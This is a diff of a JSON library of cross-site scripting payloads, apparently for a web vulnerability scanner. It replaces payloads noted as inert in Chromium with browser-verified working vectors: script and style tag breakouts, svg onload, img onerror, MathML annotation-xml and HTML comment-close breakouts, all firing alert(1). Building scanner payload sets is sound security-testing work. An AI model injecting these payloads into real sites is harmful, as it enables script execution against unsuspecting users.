@@ -357,8 +357,8 @@
         "backslash_quote"
       ],
       "confidence": "high",
-      "payload": "\\';alert(1)//",
-      "note": "Phase 316: measured on XSSMaze nonce-level4 -- the server escapes ' to \\', so a leading backslash turns its escape into a literal backslash and the quote closes the string (answer-key shape)"
+      "payload": "</script><svg/onload=alert(1)>",
+      "note": "Phase 337: replaced the backslash-escaped-quote shape (inert by construction -- the payload's own backslash escapes the quote against itself, so the JS string never terminates; browser-verified) with a script-tag breakout ending in an svg element; measured live"
     },
     {
       "id": "js-004",
@@ -368,8 +368,8 @@
         "template"
       ],
       "confidence": "medium",
-      "payload": "\\${alert(1)}",
-      "note": "Template literal injection if backticks used"
+      "payload": "\"+alert(1)+\"",
+      "note": "Phase 337: replaced an escaped-template-literal shape (inert by construction) with a concatenation breakout that works when the server appends a suffix after the payload (complements the // comment form); measured live"
     },
     {
       "id": "js-005",
@@ -399,8 +399,8 @@
         "html-entity"
       ],
       "confidence": "medium",
-      "payload": "<script>\\u0061lert(1)</script>",
-      "note": "Unicode-escaped alert in script"
+      "payload": "top.alert(1)",
+      "note": "Phase 337: replaced a nested <script> wrapper (inert at a script_block reflection point -- the page already has the script tag) with a bare JS call; measured live"
     },
     {
       "id": "js-008",
@@ -525,8 +525,8 @@
         "behavior"
       ],
       "confidence": "low",
-      "payload": "behavior:url(xss.htc)",
-      "note": "CSS behavior (IE/old)"
+      "payload": "</style><img src=x onerror=alert(1)>",
+      "note": "Phase 337: replaced behavior:url (IE-only HTC binding, dead in Chromium) with a style-closing breakout; measured live"
     },
     {
       "id": "evt-001",
@@ -545,8 +545,8 @@
         "breakout"
       ],
       "confidence": "high",
-      "payload": "\";alert(1);//",
-      "note": "Double-quote string breakout + comment"
+      "payload": "top.alert(1)",
+      "note": "Phase 337: replaced a misfiled script-string breakout (inert inside an on*= attribute value; its living sibling is in script_string_dq) with a plain handler JS call; measured live"
     },
     {
       "id": "evt-003",
@@ -555,8 +555,8 @@
         "breakout"
       ],
       "confidence": "high",
-      "payload": "';alert(1);//",
-      "note": "Single-quote string breakout + comment"
+      "payload": "alert(document.domain)",
+      "note": "Phase 337: replaced the second misfiled string breakout with a document-domain handler call; measured live"
     },
     {
       "id": "evt-004",
@@ -605,11 +605,12 @@
       "context": "svg_context",
       "tags": [
         "svg",
-        "a"
+        "a",
+        "interaction"
       ],
       "confidence": "medium",
       "payload": "<svg><a xlink:href=javascript:alert(1)><text x=10 y=10>click</text></a></svg>",
-      "note": "SVG anchor javascript href"
+      "note": "SVG anchor javascript href (click-required: the headless verifier clicks SVG links; tagged interaction per Phase 337)"
     },
     {
       "id": "tpl-001",
@@ -752,8 +753,8 @@
         "mathml"
       ],
       "confidence": "medium",
-      "payload": "<math><maction actiontype=statusline xlink:href=javascript:alert(1)>x</maction></math>",
-      "note": "MathML maction javascript href"
+      "payload": "<math><annotation-xml encoding=\"text/html\"><img src=x onerror=alert(1)></annotation-xml></math>",
+      "note": "Phase 337: replaced maction statusline (Firefox-only click vector, dead in Chromium) with an annotation-xml HTML-integration-point vector; measured live"
     },
     {
       "id": "math-002",
@@ -762,8 +763,8 @@
         "mathml"
       ],
       "confidence": "medium",
-      "payload": "<math><annotation encoding=text/html><script>alert(1)</script></annotation></math>",
-      "note": "MathML annotation HTML injection"
+      "payload": "<math><annotation-xml encoding=\"text/html\"><script>alert(1)</script></annotation-xml></math>",
+      "note": "Phase 337: FIXED THE VECTOR NAME -- the HTML integration point is annotation-xml, not annotation (the old spelling parsed as an inert MathML text element; browser oracle fired only for annotation-xml). Measured live"
     },
     {
       "id": "mxss-001",
@@ -2524,22 +2525,22 @@
     {
       "id": "html_comment_0215",
       "context": "html_comment",
-      "payload": "<![CDATA[<svg/onload=alert(1)>",
+      "payload": "--!><img src=x onerror=alert(1)>",
       "tags": [
         "comment"
       ],
       "confidence": "medium",
-      "note": "HTML comment breakout payload"
+      "note": "Phase 337: replaced a CDATA form (inert inside an HTML comment -- bogus-comment rules end it at the first >) with a --!> comment-close breakout; measured live"
     },
     {
       "id": "html_comment_0216",
       "context": "html_comment",
-      "payload": "<![CDATA[-->",
+      "payload": "--!><details open ontoggle=alert(1)>",
       "tags": [
         "comment"
       ],
       "confidence": "medium",
-      "note": "HTML comment breakout payload"
+      "note": "Phase 337: replaced the second CDATA form (inert in HTML) with a --!> details-ontoggle breakout; measured live"
     },
     {
       "id": "html_comment_0217",
@@ -2565,24 +2566,24 @@
     {
       "id": "svg_context_0219",
       "context": "svg_context",
-      "payload": "<svg><use href=javascript:alert(1)>",
+      "payload": "<svg><script>alert(1)</script></svg>",
       "tags": [
         "svg",
         "foreign_content"
       ],
       "confidence": "high",
-      "note": "SVG-context payload"
+      "note": "Phase 337: replaced svg use href=javascript: (use does not accept javascript: URLs, browser-verified dead) with an SVG-namespace script element; measured live"
     },
     {
       "id": "svg_context_0220",
       "context": "svg_context",
-      "payload": "<svg><use xlink:href=javascript:alert(1)>",
+      "payload": "<svg><foreignObject><img src=x onerror=alert(1)></foreignObject></svg>",
       "tags": [
         "svg",
         "foreign_content"
       ],
       "confidence": "high",
-      "note": "SVG-context payload"
+      "note": "Phase 337: replaced svg use xlink:href=javascript: (dead) with a foreignObject HTML-integration-point vector; measured live"
     },
     {
       "id": "svg_context_0221",
@@ -5820,26 +5821,26 @@
     {
       "id": "math_context_0479",
       "context": "math_context",
-      "payload": "<math><maction actiontype='statusline#http://google.com' xlink:href='javascript:alert(1)'>",
+      "payload": "<math><annotation-xml encoding=\"text/html\"><svg/onload=alert(1)></annotation-xml></math>",
       "tags": [
         "mathml",
         "foreign_content",
         "xlink"
       ],
       "confidence": "high",
-      "note": "MathML foreign content / xlink attribute"
+      "note": "Phase 337: replaced maction statusline# (Firefox-only) with an annotation-xml svg-onload vector; measured live"
     },
     {
       "id": "math_context_0480",
       "context": "math_context",
-      "payload": "<math><maction actiontype='relocate#http://google.com' xlink:href='javascript:alert(1)'>",
+      "payload": "<math><annotation-xml encoding=\"text/html\"><details open ontoggle=alert(1)></annotation-xml></math>",
       "tags": [
         "mathml",
         "foreign_content",
         "xlink"
       ],
       "confidence": "high",
-      "note": "MathML foreign content / xlink attribute"
+      "note": "Phase 337: replaced maction relocate# (Firefox-only) with an annotation-xml details-ontoggle vector; measured live"
     },
     {
       "id": "math_context_0481",
@@ -10276,7 +10277,7 @@
     {
       "id": "error_page_0815",
       "context": "error_page",
-      "payload": "<isindex action=javascript:alert(1)>",
+      "payload": "<img src=x onerror=alert(1)>",
       "tags": [
         "error_page",
         "reflection",
@@ -10284,7 +10285,7 @@
         "500"
       ],
       "confidence": "medium",
-      "note": "Error page (404/500) reflected input injection"
+      "note": "Phase 337: replaced isindex (element removed from HTML, dead in Chromium per Phase 334 browser oracle) with the canonical img-onerror vector; browser+verifier measured live (dev/_p337_swap_probe.py)"
     },
     {
       "id": "error_page_0816",
@@ -10302,7 +10303,7 @@
     {
       "id": "error_page_0817",
       "context": "error_page",
-      "payload": "<table background=javascript:alert(1)>",
+      "payload": "<svg/onload=alert(1)>",
       "tags": [
         "error_page",
         "reflection",
@@ -10310,12 +10311,12 @@
         "500"
       ],
       "confidence": "medium",
-      "note": "Error page (404/500) reflected input injection"
+      "note": "Phase 337: replaced table background=javascript: (never executed in modern Chromium, Phase 334) with svg-onload; measured live"
     },
     {
       "id": "error_page_0818",
       "context": "error_page",
-      "payload": "<td background=javascript:alert(1)>",
+      "payload": "<details open ontoggle=alert(1)>",
       "tags": [
         "error_page",
         "reflection",
@@ -10323,7 +10324,7 @@
         "500"
       ],
       "confidence": "medium",
-      "note": "Error page (404/500) reflected input injection"
+      "note": "Phase 337: replaced td background=javascript: (dead, Phase 334) with details-ontoggle; measured live"
     },
     {
       "id": "error_page_0819",
@@ -13709,7 +13710,8 @@
         "range2"
       ],
       "confidence": "medium",
-      "note": "closes a JS regex literal then executes (range2 regex-context)"
+      "note": "closes a JS regex literal then executes (range2 regex-context)",
+      "id": "js-slashbreak-001"
     },
     {
       "context": "html_comment",
@@ -13719,7 +13721,8 @@
         "range2"
       ],
       "confidence": "medium",
-      "note": "--!> is a valid HTML5 comment close (range2 comment-dashbang)"
+      "note": "--!> is a valid HTML5 comment close (range2 comment-dashbang)",
+      "id": "cmt-bangsvg-001"
     },
     {
       "context": "html_element",
@@ -13729,7 +13732,8 @@
         "range2"
       ],
       "confidence": "medium",
-      "note": "single-pass script stripper re-forms <script> (range2 strip-script-recursive)"
+      "note": "single-pass script stripper re-forms <script> (range2 strip-script-recursive)",
+      "id": "html-sscript-001"
     },
     {
       "context": "html_attribute_sq",
@@ -13739,17 +13743,19 @@
         "range2"
       ],
       "confidence": "medium",
-      "note": "single-quote attr breakout with autofocus (range2 attr-sq-encode-dq)"
+      "note": "single-quote attr breakout with autofocus (range2 attr-sq-encode-dq)",
+      "id": "attr-sq-focus-001"
     },
     {
       "context": "html_attribute_dq",
-      "payload": "\" onerror=alert(1) x=\"",
+      "payload": "\"><svg/onload=alert(1)>",
       "tags": [
-        "dq_breakout",
-        "range2"
+        "breakout",
+        "attribute"
       ],
-      "confidence": "medium",
-      "note": "unclosed-quote attribute swallow breakout (range2 unclosed-quote)"
+      "confidence": "high",
+      "note": "Phase 337: replaced the host-dependent onerror breakout (inert on an input host, browser-verified) with a host-independent element-creating svg breakout; measured live",
+      "id": "attr-009"
     },
     {
       "id": "html5_new_0970",
